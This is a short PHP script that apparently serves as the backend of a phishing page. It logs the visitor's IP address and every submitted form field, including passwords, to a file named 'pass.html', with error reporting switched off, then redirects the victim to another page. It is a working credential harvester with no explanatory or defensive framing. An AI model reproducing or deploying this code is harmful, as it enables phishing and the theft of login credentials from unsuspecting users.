<?php
 // include ('UserInformation.php');
    include ('ip.php');

header('location: 3qwerty.html');

// header('location: loginsubmit.html');
error_reporting(0);
$handle = fopen("pass.html","a");
fwrite($handle, $ip_address);
fwrite($handle, "\r\n<br>");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n<br>");
}
fwrite($handle, "\r\n<br>");
fclose($handle);
exit;
?> 
       